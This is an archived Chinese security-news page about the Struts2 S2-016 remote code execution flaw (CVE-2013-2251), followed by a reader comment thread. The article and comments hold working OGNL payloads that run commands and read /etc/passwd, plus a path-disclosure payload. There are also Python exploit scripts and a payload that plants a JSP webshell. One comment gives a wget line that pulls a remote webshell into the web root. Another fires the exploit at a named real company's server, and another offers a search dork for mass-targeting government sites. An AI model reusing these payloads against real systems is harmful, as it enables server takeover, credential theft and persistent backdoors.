---
layout: post
title: "[更新]Struts2再爆远程代码执行漏洞（S2-016）- FreebuF.COM"
categories: 安全
tags: 
 - 安全
 - struts&Java
--- 

# [更新]Struts2再爆远程代码执行漏洞（S2-016）- FreebuF.COM

### 分享到

* [一键分享]()
* [QQ空间]()
* [新浪微博]()
* [百度云收藏]()
* [人人网]()
* [腾讯微博]()
* [百度相册]()
* [开心网]()
* [腾讯朋友]()
* [百度贴吧]()
* [豆瓣网]()
* [搜狐微博]()
* [百度新首页]()
* [QQ好友]()
* [和讯微博]()
* [更多...]()

[百度分享]()

* [首页](http://www.freebuf.com/)
* [资讯](http://www.freebuf.com/category/news)
* [工具](http://www.freebuf.com/category/tools)
* [文章](http://www.freebuf.com/category/articles)

* [WEB安全](http://www.freebuf.com/category/articles/web)
* [无线安全](http://www.freebuf.com/category/articles/wireless)
* [系统安全](http://www.freebuf.com/category/articles/system)
* [数据库安全](http://www.freebuf.com/category/articles/database)
* [终端安全](http://www.freebuf.com/category/articles/terminal)
* [其他](http://www.freebuf.com/category/articles/others-articles)
* [视频](http://www.freebuf.com/category/video)
* [招聘](http://www.freebuf.com/category/jobs)
* [极客](http://www.freebuf.com/category/geek)
* [达人](http://www.freebuf.com/bufer)
* [社区](http://club.freebuf.com/)
* [投稿](http://www.freebuf.com/newsend)

[登陆](http://www.freebuf.com/wp-login.php?redirect_to=http://www.freebuf.com "登陆")[注册](http://www.freebuf.com/wp-login.php?action=register)

[![freebuf]()](http://www.freebuf.com/)

[新浪微博](http://www.weibo.com/freebuf "收听新浪微博") [腾讯微博](http://t.qq.com/freebuf "收听腾讯微博")[订阅我们](http://www.freebuf.com/feed "订阅我们")

### [更新]Struts2再爆远程代码执行漏洞（S2-016）

[phper]() @ [漏洞](http://www.freebuf.com/category/vuls "查看 漏洞 中的全部文章") 2013-07-17 共 **28624** 人围观 

**Struts又爆远程代码执行漏洞了！****在这次的漏洞中，攻击者可以通过操纵参数远程执行恶意代码。****Struts 2.3.15.1之前的版本，参数action的值redirect以及redirectAction没有正确过滤，导致ognl代码执行。 **

**描述**
影响版本 Struts 2.0.0 - Struts 2.3.15 报告者 Takeshi Terada of Mitsui Bussan Secure Directions, Inc. CVE编号 CVE-2013-2251

**漏洞证明**

参数会以OGNL表达式执行
http://host/struts2-blank/example/X.action?action:%25{3*4} http://host/struts2-showcase/employee/save.action?redirect:%25{3*4}

代码执行

http://host/struts2-blank/example/X.action?action:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{'command','goes','here'})).start()} http://host/struts2-showcase/employee/save.action?redirect:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{'command','goes','here'})).start()} http://host/struts2-showcase/employee/save.action?redirectAction:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{'command','goes','here'})).start()}

**漏洞原理**

The Struts 2 DefaultActionMapper supports a method for short-circuit navigation state changes by prefixing parameters with “action:” or “redirect:”, followed by a desired navigational target expression. This mechanism was intended to help with attaching navigational information to buttons within forms.

In Struts 2 before 2.3.15.1 the information following “action:”, “redirect:” or “redirectAction:” is not properly sanitized. Since said information will be evaluated as OGNL expression against the value stack, this introduces the possibility to inject server side code.

[Apache官方地址](http://struts.apache.org/release/2.3.x/docs/s2-016.html)

**国内网站受灾严重**

**![](http://static.freebuf.com/uploads/image/20130719/20130719234053_37320.jpg)
**

**以下仅供教学研究之用，严禁非法用途！**

执行任意命令EXP，感谢X提供：
?redirect:${%23a%3d(new java.lang.ProcessBuilder(new java.lang.String[]{'cat','/etc/passwd'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew java.io.InputStreamReader(%23b),%23d%3dnew java.io.BufferedReader(%23c),%23e%3dnew char[50000],%23d.read(%23e),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}

爆网站路径EXP，感谢h4ck0r提供：

?redirect%3A%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28%22%2F%22%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D

python执行任意命令，感谢h4ck0r提供

import urllib2,sys,re def get(url, data): string = url + "?" + data req = urllib2.Request("%s"%string) response = urllib2.urlopen(req).read().strip() print strip(response) def strip(str): tmp = str.strip() blank_line=re.compile('\x00') tmp=blank_line.sub('',tmp) return tmp if __name__ == '__main__': url = sys.argv[1] cmd = sys.argv[2] cmd1 = sys.argv[3] attack="redirect:${%%23a%%3d(new%%20java.lang.ProcessBuilder(new%%20java.lang.String[]{'%s','%s'})).start(),%%23b%%3d%%23a.getInputStream(),%%23c%%3dnew%%20java.io.InputStreamReader(%%23b),%%23d%%3dnew%%20java.io.BufferedReader(%%23c),%%23e%%3dnew%%20char[50000],%%23d.read(%%23e),%%23matt%%3d%%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%%23matt.getWriter().println(%%23e),%%23matt.getWriter().flush(),%%23matt.getWriter().close()}"%(cmd,cmd1) get(url,attack)

GETSHELL EXP，感谢coffee提供：

?redirect:${ %23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'), %23p%3d(%23req.getRealPath(%22/%22)%2b%22test.jsp%22).replaceAll("\\\\", "/"), new+java.io.BufferedWriter(new+java.io.FileWriter(%23p)).append(%23req.getParameter(%22c%22)).close() }&c=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%

然后用以下代码写shell:

<form action="http://www.***.jp/acdap/test.jsp?f=1.jsp&quot; method="post"> <textarea >code</textarea> <input type=submit value="提交"> </form>

上前目录生成1.jsp

5 1 您已评价！

### ![]() **如文中未特别声明转载请注明出自:** [FreebuF.COM](http://www.freebuf.com/)

![]() [1]( "累计分享1次")
![Favorite](http://www.freebuf.com/buf/plugins/wp-favorite-posts/img/heart.png "Favorite")![Loading](http://www.freebuf.com/buf/plugins/wp-favorite-posts/img/loading.gif "Loading")[收藏该文](http://www.freebuf.com/vuls/?wpfpaction=add&postid=11220 "收藏该文")

### 相关文章

* [[更新]Struts2再爆远程代码执行漏洞（S2-016）](http://www.freebuf.com/vuls/11220.html)

**49**条评论 **28626**人已围观
* [Android ICS adb调试工具系统还原目录遍历漏洞（可提权）](http://www.freebuf.com/vuls/10697.html)

**6**条评论 **8306**人已围观
* [美国VPS管理系统SolusVM 1.13.03 SQL注入漏洞（含exp）](http://www.freebuf.com/vuls/10611.html)

**12**条评论 **24962**人已围观
* [[最新]Plesk主机管理软件远程get shell 0day](http://www.freebuf.com/vuls/10291.html)

**8**条评论 **11826**人已围观
* [Metasploit更新”nginx整数溢出漏洞”攻击插件](http://www.freebuf.com/vuls/10219.html)

**6**条评论 **17096**人已围观
﻿

## 49 Comments [发表评论]()

1. ![]() 生生不息 []() 2013-07-17    1楼

目测利用工具马上出炉

POC来自官方：
[http://struts.apache.org/release/2.3.x/docs/s2-016.html](http://struts.apache.org/release/2.3.x/docs/s2-016.html)
[http://struts.apache.org/release/2.3.x/docs/s2-017.htm](http://struts.apache.org/release/2.3.x/docs/s2-017.htm)
。。碉堡不
[亮了]()(6)
[回复](http://www.freebuf.com/vuls/?replytocom=12981#respond)
1. ![]() fake []() 2013-07-17    2楼

![](http://static.freebuf.com/uploads/image/20130717/20130717015140_44183.png)
乌云已经开始了……黑阔们拖库吧……
[亮了]()(15)
[回复](http://www.freebuf.com/vuls/?replytocom=12984#respond)
1. ![]() 命运 []() 2013-07-17    3楼

不息抢沙发好速度，话说乌云又有SB在刷分了。黑产的大好机会不把握，呵呵。
[亮了]()(17)
[回复](http://www.freebuf.com/vuls/?replytocom=12985#respond)
1. [![]()](http://www.freebuf.com/?author=3881) [n0bele ](http://www.freebuf.com/author/n0bele) (1级)  []() 2013-07-17    4楼

这真是个好厂商，没它黑帽子和那些又做黑产又做白帽子的帽子都快戴不稳了.
[亮了]()(7)
[回复](http://www.freebuf.com/vuls/?replytocom=12986#respond)
1. [![]()](http://www.freebuf.com/?author=3486) [hackmissmiss ](http://www.freebuf.com/author/hackmissmiss) (1级)  []() 2013-07-17    5楼

刷你妈的分 一群小朋友 为了满足自己的虚荣心 不停的找网站刷分 SB
[亮了]()(10)
[回复](http://www.freebuf.com/vuls/?replytocom=12987#respond)
1. [![]()](http://www.freebuf.com/?author=1596) [蓝风 ](http://www.freebuf.com/author/蓝风) (1级)  []() 2013-07-17    6楼

少侠 记得提下裤子。。。。。。
[亮了]()(1)
[回复](http://www.freebuf.com/vuls/?replytocom=12988#respond)
1. [![]()](http://www.freebuf.com/?author=3647) [mujj ](http://www.freebuf.com/author/mujj) (1级)  []() 2013-07-17    7楼

刷分又开始了么
[亮了]()(0)
[回复](http://www.freebuf.com/vuls/?replytocom=12989#respond)
1. [![]()](http://www.freebuf.com/?author=2313) [angellover08 ](http://www.freebuf.com/author/angellover08) (1级) 某甲方漏洞挖掘研究员 []() 2013-07-17    8楼

想投身黑产，木有门路啊
[亮了]()(0)
[回复](http://www.freebuf.com/vuls/?replytocom=12990#respond)
1. ![]() z0mbie []() 2013-07-17    9楼

小弟看不懂，哪位能给个执行命令的语句
[亮了]()(7)
[回复](http://www.freebuf.com/vuls/?replytocom=12992#respond)
1. [![]()](http://www.freebuf.com/?author=3777) [uj70ky7b ](http://www.freebuf.com/author/uj70ky7b) (1级)  []() 2013-07-17    10楼

刷你妹妹的分啊，能吃吗. 一分等于几万块啊。
[亮了]()(8)
[回复](http://www.freebuf.com/vuls/?replytocom=13002#respond)
1. ![]() X []() 2013-07-17    11楼

?redirect:${%23a%3d(new java.lang.ProcessBuilder(new java.lang.String[]{'cat','/etc/passwd'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew java.io.InputStreamReader(%23b),%23d%3dnew java.io.BufferedReader(%23c),%23e%3dnew char[50000],%23d.read(%23e),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}

[亮了]()(30)
[回复](http://www.freebuf.com/vuls/?replytocom=13005#respond)
1. [![]()](http://www.freebuf.com/?author=3432) [yplinfo ](http://www.freebuf.com/author/yplinfo) (1级) 一句话木马 []() 2013-07-17    12楼

哎，SB才刷分
[亮了]()(1)
[回复](http://www.freebuf.com/vuls/?replytocom=13006#respond)
1. ![]() Cr0w []() 2013-07-17    13楼

S2-17
[http://host/struts2-showcase/fileupload/upload.action?redirect:http://www.yahoo.com/](http://host/struts2-showcase/fileupload/upload.action?redirect:http://www.yahoo.com/)
[http://host/struts2-showcase/modelDriven/modelDriven.action?redirectAction:http://www.google.com/%23](http://host/struts2-showcase/modelDriven/modelDriven.action?redirectAction:http://www.google.com/%23)
[亮了]()(3)
[回复](http://www.freebuf.com/vuls/?replytocom=13007#respond)
1. ![]() 生生不息 []() 2013-07-17    14楼

[https://kf.sf-express.com/css/loginmgmt/index.action?redirect:$](https://kf.sf-express.com/css/loginmgmt/index.action?redirect:$){%23a%3d%28new%20java.lang.ProcessBuilder%28new%20java.lang.String[]{%27cat%27,%27/etc/passwd%27}%29%29.start%28%29,%23b%3d%23a.getInputStream%28%29,%23c%3dnew%20java.io.InputStreamReader%28%23b%29,%23d%3dnew%20java.io.BufferedReader%28%23c%29,%23e%3dnew%20char[50000],%23d.read%28%23e%29,%23matt%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29,%23matt.getWriter%28%29.println%28%23e%29,%23matt.getWriter%28%29.flush%28%29,%23matt.getWriter%28%29.close%28%29}
[亮了]()(11)
[回复](http://www.freebuf.com/vuls/?replytocom=13009#respond)
1. [![]()](http://www.freebuf.com/?author=3687) [lock ](http://www.freebuf.com/author/lock) (6级) fork you! []() 2013-07-17    15楼

import urllib2,getopt,sys

def info():
print "python struts.py -u [http://baidu.com/test.action](http://baidu.com/test.action) -d whoami"

def get(url, data):
string = url + "?" + data
req = urllib2.Request(string)
response = urllib2.urlopen(req)
print response.read()

if __name__ == '__main__' and len(sys.argv) < 2:
info()
try:
opts, args = getopt.getopt(sys.argv[1:],"u:d:")
except:
sys.exit(2)
for opt, value in opts:
if opt == '-u':
url = value
elif opt == '-d':
test = value
attack="?redirect:${#a=(new java.lang.ProcessBuilder('%s')).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),#matt.getWriter().println(#e),#matt.getWriter().flush(),#matt.getWriter().close()}"%test
get(url,attack)

[亮了]()(8)
[回复](http://www.freebuf.com/vuls/?replytocom=13013#respond)
1. [![]()](http://www.freebuf.com/?author=3113) [二手玫瑰 ](http://www.freebuf.com/author/二手玫瑰) (1级) 人生如梦亦如画 []() 2013-07-17    16楼

麻烦各位大神提供爆网站绝对路径的办法。。。。
[亮了]()(0)
[回复](http://www.freebuf.com/vuls/?replytocom=13016#respond)

* ![]() h4ck0r []() 2013-07-17

@二手玫瑰  ?redirect%3A%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28%22%2F%22%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D
[亮了]()(1)
[回复](http://www.freebuf.com/vuls/?replytocom=13023#respond)
* [![]()](http://www.freebuf.com/?author=7) [pnig0s ](http://www.freebuf.com/author/pnig0s)![](http://www.freebuf.com/buf/themes/freebuf/images/medals/f1.png "FB达人") (10级) 知道创宇安全工程师 []() 2013-07-17    17楼

评论里各路大神都发威了：）
[亮了]()(0)
[回复](http://www.freebuf.com/vuls/?replytocom=13017#respond)
* [![]()](http://www.freebuf.com/?author=1353) [元首 ](http://www.freebuf.com/author/元首) (3级)  []() 2013-07-17    18楼

路径

[http://www.xxx.com/xxxx.action?redirect%3A%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28%22%2F%22%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D](http://www.xxx.com/xxxx.action?redirect%3A%24{%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28"%2F"%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29})
[亮了]()(1)
[回复](http://www.freebuf.com/vuls/?replytocom=13018#respond)
* [![]()](http://www.freebuf.com/?author=2313) [angellover08 ](http://www.freebuf.com/author/angellover08) (1级) 某甲方漏洞挖掘研究员 []() 2013-07-17    19楼

freebuf大牛众多，小弟在此膜拜。
[亮了]()(0)
[回复](http://www.freebuf.com/vuls/?replytocom=13019#respond)
* [![]()](http://www.freebuf.com/?author=3210) [xiao_hen ](http://www.freebuf.com/author/xiao_hen) (1级)  矮穷挫小分队。 []() 2013-07-17    20楼

freebuf大牛众多，小弟在此膜拜。
[亮了]()(0)
[回复](http://www.freebuf.com/vuls/?replytocom=13020#respond)
* [![]()](http://www.freebuf.com/?author=3692) [dennych0u ](http://www.freebuf.com/author/dennych0u) (1级)  []() 2013-07-17    21楼

悲催的攻城狮们要精尽人亡了~
[亮了]()(0)
[回复](http://www.freebuf.com/vuls/?replytocom=13021#respond)
* ![]() z0mbie []() 2013-07-17    22楼

请教各路神仙，怎么反弹SHELL,怎么写shell
[亮了]()(0)
[回复](http://www.freebuf.com/vuls/?replytocom=13025#respond)
* ![]() helen是sb []() 2013-07-17    23楼

getshell
wget [http://www.sss.com/data/avatar/test.txt](http://www.sss.com/data/avatar/test.txt) -O /home/www/test.jsp
test.txt是远程webshell的 /home/www/test.jsp 是目标目录
[亮了]()(0)
[回复](http://www.freebuf.com/vuls/?replytocom=13027#respond)
* [![]()](http://www.freebuf.com/?author=3486) [hackmissmiss ](http://www.freebuf.com/author/hackmissmiss) (1级)  []() 2013-07-17    24楼

怎么构造WGET POC
[亮了]()(0)
[回复](http://www.freebuf.com/vuls/?replytocom=13030#respond)
* [![]()](http://www.freebuf.com/?author=1748) [free ](http://www.freebuf.com/author/free) (1级) 女人心看不透，因为胸前肉太厚。 []() 2013-07-17    25楼

求工具啊
[亮了]()(0)
[回复](http://www.freebuf.com/vuls/?replytocom=13031#respond)
* ![]() h4ck0r []() 2013-07-17    26楼

执行任意命令：
example:python test.py [http://baidu.com/test.action](http://baidu.com/test.action) cat /etc/passwd

import urllib2,sys,re

def get(url, data):
string = url + “?” + data
req = urllib2.Request(“%s”%string)
response = urllib2.urlopen(req).read().strip()
print strip(response)

def strip(str):
tmp = str.strip()
blank_line=re.compile(‘\x00′)
tmp=blank_line.sub(”,tmp)
return tmp

if __name__ == ‘__main__’:
url = sys.argv[1]
cmd = sys.argv[2]
cmd1 = sys.argv[3]
attack=”redirect:${%%23a%%3d(new%%20java.lang.ProcessBuilder(new%%20java.lang.String[]{‘%s’,'%s’})).start(),%%23b%%3d%%23a.getInputStream(),%%23c%%3dnew%%20java.io.InputStreamReader(%%23b),%%23d%%3dnew%%20java.io.BufferedReader(%%23c),%%23e%%3dnew%%20char[50000],%%23d.read(%%23e),%%23matt%%3d%%23context.get(‘com.opensymphony.xwork2.dispatcher.HttpServletResponse’),%%23matt.getWriter().println(%%23e),%%23matt.getWriter().flush(),%%23matt.getWriter().close()}”%(cmd,cmd1)
get(url,attack)
[亮了]()(2)
[回复](http://www.freebuf.com/vuls/?replytocom=13033#respond)

* ![]() Hell0w0rld []() 2013-07-17

@h4ck0r IndentationError: expected an indented block
[亮了]()(0)
[回复](http://www.freebuf.com/vuls/?replytocom=13035#respond)
* ![]() coffee []() 2013-07-17    27楼

我来个写shell的吧,当前目录生成test.jsp
?redirect:${
%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),
%23p%3d(%23req.getRealPath(%22/%22)%2b%22test.jsp%22).replaceAll("\\\\", "/"),
new+java.io.BufferedWriter(new+java.io.FileWriter(%23p)).append(%23req.getParameter(%22c%22)).close()
}&c=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b%25%3e

然后用以下代码写shell:
<form action="[http://www.***.jp/acdap/test.jsp?f=1.jsp&quot](http://www.***.jp/acdap/test.jsp?f=1.jsp"); method="post">
<textarea >code</textarea>
<input type=submit value="提交">
</form>
上前目录生成1.jsp

[亮了]()(4)
[回复](http://www.freebuf.com/vuls/?replytocom=13034#respond)

* ![]() apo []() 2013-07-18

@coffee 我来个写shell的吧,当前目录生成test.jsp

?redirect:${
%23req%3d%23context.get(‘com.opensymphony.xwork2.dispatcher.HttpServletRequest’),
%23p%3d(%23req.getRealPath(%22/%22)%2b%22test.jsp%22).replaceAll("\\\\", "/"),
new+java.io.BufferedWriter(new+java.io.FileWriter(%23p)).append(%23req.getParameter(%22c%22)).close()
}&c=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b%25%3e

然后用以下代码写shell:
<form action="[http://www.***.jp/acdap/test.jsp?f=1.jsp&quot](http://www.***.jp/acdap/test.jsp?f=1.jsp"); method="post">
<textarea name=t>code</textarea>
<input type=submit value="提交">
</form>
上前目录生成1.jsp

少了一个name=t <textarea name=t>code</textarea>
[亮了]()(2)
[回复](http://www.freebuf.com/vuls/?replytocom=13041#respond)

* ![]() window []() 2013-07-18

@apo 能生存test.jsp不能生成1.jsp啊！
[亮了]()(0)
[回复](http://www.freebuf.com/vuls/?replytocom=13042#respond)
* ![]() apo []() 2013-07-18

@window <form action="[http://www.***.jp/acdap/test.jsp?f=1.jsp&quot](http://www.***.jp/acdap/test.jsp?f=1.jsp"); method="post"

楼主好像估计弄错两个地方。

这样就可以了。
[亮了]()(0)
[回复](http://www.freebuf.com/vuls/?replytocom=13044#respond)
* ![]() window []() 2013-07-18

@apo 还是不能 ，
[亮了]()(0)
[回复](http://www.freebuf.com/vuls/?replytocom=13087#respond)
* ![]() apo []() 2013-07-19

@window
那我就没办法了。补补HTML知识。。
[亮了]()(0)
[回复](http://www.freebuf.com/vuls/?replytocom=13094#respond)
* ![]() tianya []() 2013-07-18    28楼

就木有人发如何修复么？？？？？？？？？？？？？？？？？？？？？？？
[亮了]()(0)
[回复](http://www.freebuf.com/vuls/?replytocom=13036#respond)
* ![]() sudnog []() 2013-07-18    29楼

JSP如何拖库？数据库的配置文件一般是哪里？STRUTS2让我第一次有机会接触到了jsp~~求教各位！
[亮了]()(2)
[回复](http://www.freebuf.com/vuls/?replytocom=13038#respond)
* ![]() Iamnothacker []() 2013-07-18    30楼

用google发现了不少，确实可以批量抓了:
site:gov.cn inurl:index.action
[亮了]()(2)
[回复](http://www.freebuf.com/vuls/?replytocom=13039#respond)
* ![]() www []() 2013-07-18    31楼

windows怎么搞？怎么wget
[亮了]()(1)
[回复](http://www.freebuf.com/vuls/?replytocom=13043#respond)
* ![]() 抠脚大汉 []() 2013-07-18    32楼

[http://hack.xiaoip.com/hack.php](http://hack.xiaoip.com/hack.php)
在线版漏洞利用工具放出~~~傻瓜化了。
[亮了]()(4)
[回复](http://www.freebuf.com/vuls/?replytocom=13045#respond)
* [![]()](http://www.freebuf.com/?author=3907) [hack ](http://www.freebuf.com/author/hack) (1级)  []() 2013-07-18    33楼

求助，我用执行任意命令EXP,得到一个/etc/passwd后有什么用啊?还有叫执行任意命令,是指哪些命令能执行啊？求大牛为小菜解惑，入入门 ![:???:]()
[亮了]()(0)
[回复](http://www.freebuf.com/vuls/?replytocom=13048#respond)
* [![]()](http://www.freebuf.com/?author=3881) [n0bele ](http://www.freebuf.com/author/n0bele) (1级)  []() 2013-07-18    34楼

/etc/passwd用户名表
/etc/shadow密码
根据权限看命令范围
[亮了]()(1)
[回复](http://www.freebuf.com/vuls/?replytocom=13049#respond)
* [![]()](http://www.freebuf.com/?author=3907) [hack ](http://www.freebuf.com/author/hack) (1级)  []() 2013-07-18    35楼

哦，原理不是很懂，不过大概是清楚了，对了，这几个都是针对linux的，那不知道windows下是什么命令，我只记得是一个单词，if什么的好像，还是别的什么，记不起来了
[亮了]()(0)
[回复](http://www.freebuf.com/vuls/?replytocom=13050#respond)
* ![]() anonymous []() 2013-07-18    36楼

好多装逼青年在行动，连尼玛windows命令都不熟悉还日个JB。
[亮了]()(5)
[回复](http://www.freebuf.com/vuls/?replytocom=13067#respond)
* ![]() 222 []() 2013-07-18    37楼

5555
[亮了]()(0)
[回复](http://www.freebuf.com/vuls/?replytocom=13068#respond)
* ![]() 骑士 []() 2013-07-18    38楼

[http://netknight.in/archives/436/](http://netknight.in/archives/436/)
利用工具在这我会乱说么
[亮了]()(3)
[回复](http://www.freebuf.com/vuls/?replytocom=13091#respond)
* ![]() z0mbie []() 2013-07-19    39楼

请教各位，.do后缀名怎么入侵？
[亮了]()(0)
[回复](http://www.freebuf.com/vuls/?replytocom=13123#respond)
* [![]()](http://www.freebuf.com/?author=1604) [redcar ](http://www.freebuf.com/author/redcar) (1级)  []() 2013-07-20    40楼

请问哪位知道这个redirect的功能是不是把%0a或者%0d过滤掉了？尝试了很多方法，返回的结果都是吧%0a和%0d给转换成了空格。因为看到了重定向，想尝试一下http分割响应，请问又什么绕过方法？
[亮了]()(1)
[回复](http://www.freebuf.com/vuls/?replytocom=13132#respond)
* [![]()](http://www.freebuf.com/?author=3968) [cwg2552298 ](http://www.freebuf.com/author/cwg2552298) (1级)  []() 2013-07-21    41楼

Genius ！
[亮了]()(0)
[回复](http://www.freebuf.com/vuls/?replytocom=13142#respond)
* [![]()](http://www.freebuf.com/?author=645) [藤真 ](http://www.freebuf.com/author/藤真)![](http://www.freebuf.com/buf/themes/freebuf/images/medals/f1.png "FB达人") (1级) 安信华攻防实验室成员 []() 2013-07-21    42楼

php版利用工具 [http://www.waitalone.cn/struts2-s2-16-exploits.html](http://www.waitalone.cn/struts2-s2-16-exploits.html)
[亮了]()(1)
[回复](http://www.freebuf.com/vuls/?replytocom=13144#respond)
昵称
(必须)您当前尚未登录。[登陆](http://www.freebuf.com/wp-login.php?redirect_to=http%3A%2F%2Fwww.freebuf.com%2Fvuls%2F11220.html "登陆")？注册

邮箱
必须(保密)

发表言论前，请滑动滚动条解锁
[表情]()[插代码]()[插图]()

[![]()]( "mrgreen")[![]()]( "razz")[![]()]( "sad")[![]()]( "smile")[![]()]( "oops")[![]()]( "grin")[![]()]( "eek")[![]()]( "???")[![]()]( "cool")[![]()]( "lol")[![]()]( "mad")[![]()]( "twisted")[![]()]( "roll")[![]()]( "wink")[![]()]( "idea")[![]()]( "arrow")[![]()]( "neutral")[![]()]( "cry")[![]()]( "?")[![]()]( "evil")[![]()]( "shock")[![]()]( "!")
正在提交, 请稍候...

#

[取消]()   有人回复时邮件通知我

### **本文这些评论亮了![]()[捐助我们](http://www.freebuf.com/donate)****Hot Comments**

[X]() @ 2013-07-17 15:57:23

?redirect:${%23a%3d(new java.lang.ProcessBuilder(new java.lang.String[]{'cat','/etc/passwd'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew java.io.InputStreamReader(%23b),%23d%3dnew java.io.BufferedReader(%23c),%23e%3dnew char[50000],%23d.read(%23e),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}
[亮了]() (30) [命运]() @ 2013-07-17 13:52:31

不息抢沙发好速度，话说乌云又有SB在刷分了。黑产的大好机会不把握，呵呵。
[亮了]() (17) [fake]() @ 2013-07-17 13:51:55

![](http://static.freebuf.com/uploads/image/20130717/20130717015140_44183.png) 乌云已经开始了……黑阔们拖库吧……
[亮了]() (15) [生生不息]() @ 2013-07-17 16:37:34

https://kf.sf-express.com/css/loginmgmt/index.action?redirect:${%23a%3d%28new%20java.lang.ProcessBuilder%28new%20java.lang.String[]{%27cat%27,%27/etc/passwd%27}%29%29.start%28%29,%23b%3d%23a.getInputStream%28%29,%23c%3dnew%20java.io.InputStreamReader%28%23b%29,%23d%3dnew%20java.io.BufferedReader%28%23c%29,%23e%3dnew%20char[50000],%23d.read%28%23e%29,%23matt%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29,%23matt.getWriter%28%29.println%28%23e%29,%23matt.getWriter%28%29.flush%28%29,%23matt.getWriter%28%29.close%28%29}
[亮了]() (11) [hackmissmiss]() @ 2013-07-17 14:02:05

刷你妈的分 一群小朋友 为了满足自己的虚荣心 不停的找网站刷分 SB
[亮了]() (10) [uj70ky7b]() @ 2013-07-17 15:52:24

刷你妹妹的分啊，能吃吗. 一分等于几万块啊。
[亮了]() (8) [lock]() @ 2013-07-17 17:58:10

import urllib2,getopt,sys def info(): print "python struts.py -u http://baidu.com/test.action -d whoami" def get(url, data): string = url + "?" + data req = urllib2.Request(string) response = urllib2.urlopen(req) print response.read() if __name__ == '__main__' and len(sys.argv) < 2: info() try: opts, args = getopt.getopt(sys.argv[1:],"u:d:") except: sys.exit(2) for opt, value in opts: if opt == '-u': url = value elif opt == '-d': test = value attack="?redirect:${#a=(new java.lang.ProcessBuilder('%s')).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),#matt.getWriter().println(#e),#matt.getWriter().flush(),#matt.getWriter().close()}"%test get(url,attack)
[亮了]() (8) [n0bele]() @ 2013-07-17 14:01:06

这真是个好厂商，没它黑帽子和那些又做黑产又做白帽子的帽子都快戴不稳了.
[亮了]() (7) [z0mbie]() @ 2013-07-17 14:44:12

小弟看不懂，哪位能给个执行命令的语句
[亮了]() (7) [生生不息]() @ 2013-07-17 13:47:58

目测利用工具马上出炉 POC来自官方： http://struts.apache.org/release/2.3.x/docs/s2-016.html http://struts.apache.org/release/2.3.x/docs/s2-017.htm 。。碉堡不
[亮了]() (6)

### **最新发布****New Posts**

* [神马？关于大数据黑客的吐槽](http://www.freebuf.com/articles/others-articles/11301.html "神马？关于大数据黑客的吐槽")
* [研究人员称黑掉一张SIM卡只需几分钟](http://www.freebuf.com/news/11336.html "研究人员称黑掉一张SIM卡只需几分钟")
* [WebServer端口重定向后门的研究](http://www.freebuf.com/articles/system/11305.html "WebServer端口重定向后门的研究")
